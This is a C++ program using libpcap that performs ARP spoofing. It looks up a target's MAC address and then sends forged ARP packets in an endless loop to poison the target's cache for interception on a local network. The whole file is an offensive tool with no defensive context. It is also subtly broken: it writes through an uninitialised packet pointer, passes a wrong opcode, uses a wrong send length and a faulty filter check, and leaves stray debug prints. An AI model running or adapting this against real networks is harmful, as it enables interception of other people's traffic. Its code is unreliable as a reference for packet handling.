#include <arpa/inet.h>
#include <cstdlib>
#include <cstring>
#include <iomanip>
#include <iostream>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <pcap.h>
#include <sstream>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
using namespace std;
using HwAddr = uint8_t[6];
using IpAddr = in_addr;
#pragma pack(push, 1)
struct arp_packet {
    ethhdr eth;
    ether_arp arp;
};
#pragma pack(pop)

int make_arp_pk(uint8_t* packet_out, uint16_t opcode, HwAddr smac, IpAddr sip, HwAddr tmac, IpAddr tip)
{
    cout << "god" << endl;
    int l = 0;
    ethhdr eth;
    ether_arp arp;
    if (opcode == ARPOP_REQUEST) {
        uint8_t broadcast[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
        memcpy(eth.h_dest, broadcast, 6);
    } else {
        stringstream ss;
        memcpy(eth.h_dest, tmac, 6);
    }
    memcpy(eth.h_source, smac, 6);

    eth.h_proto = htons(ETHERTYPE_ARP);
        
    memcpy(packet_out, &eth, 14);
    cout << "godd" << endl;
    l += sizeof(eth);

    arp.arp_hrd = htons(0x0001);
    arp.arp_pro = htons(0x0800);
    arp.arp_hln = 0x06;
    arp.arp_pln = 0x04;
    arp.arp_op = htons(opcode);
    memcpy(arp.arp_sha, smac, 6);
    memcpy(arp.arp_spa, &sip, 4);
    memcpy(arp.arp_tha, tmac, 6);
    memcpy(arp.arp_tpa, &tip, 4);

    memcpy(packet_out + l, &arp, sizeof(arp));
    l += sizeof(arp);

    return l;
}

bool get_my_mac(HwAddr* mac_out, const char* dev)
{
    ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    strncpy(ifr.ifr_name, dev, IF_NAMESIZE - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) != 0) {
        close(fd);
        return false;
    }
    memcpy(mac_out, (uint8_t*)&ifr.ifr_addr.sa_data, 6);
    close(fd);
    return true;
}

bool get_target_mac(const char* dev, const IpAddr sip, const IpAddr tip, HwAddr tmac_out)
{
    char errbuff[PCAP_ERRBUF_SIZE] = {
        0,
    };
    pcap* desc = pcap_open_live(dev, 8192, 0, 512, errbuff);
    if (desc == nullptr)
        throw;
    HwAddr my_mac;
    get_my_mac(&my_mac, dev);
    uint8_t* packet = (uint8_t*)malloc(sizeof(arp_packet));
    HwAddr bin_mac = { 0, 0, 0, 0, 0, 0 };
    auto a = make_arp_pk(packet, ARPOP_REQUEST, my_mac, sip, bin_mac, tip);
    stringstream ss;

    if (pcap_sendpacket(desc, packet, sizeof(arp_packet)) != 0) {
        throw;
    }
    bpf_program* filter = new bpf_program;
    if (pcap_compile(desc, filter, "arp", 1, 0) == -1 and pcap_setfilter(desc, filter) == -1) {
        cout << "err" << endl;
        throw;
    }
    pcap_pkthdr* hdr;
    const u_char* pkt;
    int res = 0;
    while ((res = pcap_next_ex(desc, &hdr, &pkt)) >= 0) {
        if (res == 0)
            continue;
        arp_packet* arp = (arp_packet*)pkt;
        cout << htons(arp->arp.arp_op) << endl;
        uint32_t* ap = (uint32_t*)arp->arp.arp_sha;

        if ((htons(arp->arp.arp_op) == ARPOP_REPLY)) {
            ss.str("");
            for (int i = 0; i < 6; i++) {
                ss << hex << setfill('0') << setw(2) << int(arp->arp.arp_sha[i]) << " ";
                tmac_out[i] = arp->arp.arp_sha[i];
            }
            cout << ss.str() << endl;  
            
            cout << "good" << endl;
            return 0;
        }
    }
    return -1;
}

void arp_spoof(const char* dev, IpAddr sip, IpAddr tip, pcap_t* desc)
{
    cout << "open dev" << endl;
    HwAddr smac;

    get_my_mac(&smac, dev);

    HwAddr tmac;
    cout << "smac" << endl;

    get_target_mac(dev, sip, tip, tmac);

    uint8_t* packet;
    
    make_arp_pk(packet, ETHERTYPE_ARP, smac, sip, tmac, tip);

    cout << "start arp spoof" << endl;
    int i = 0;
    while (true) {        
        usleep(60);
        if (pcap_sendpacket(desc, packet, sizeof(ether_arp)) != 0) {
            break;
        }        
        cout << "Sent packet: " << i++ << endl;
    }
}

int main(int argc, char* argv[])
{
    if (argc != 4) {
        return -1;
    }
    char* dev = argv[1];

    char errbuf[PCAP_ERRBUF_SIZE] = {
        0,
    };
    pcap* desc;
    if ((desc = pcap_open_live(dev, 8192, 0, 512, errbuf)) == nullptr) {
        //TODO
        return -1;
    }
    IpAddr sip, dip;
    inet_pton(AF_INET, argv[2], &sip);
    inet_pton(AF_INET, argv[3], &dip);
    arp_spoof(dev, sip, dip, desc);
    return 0;
}
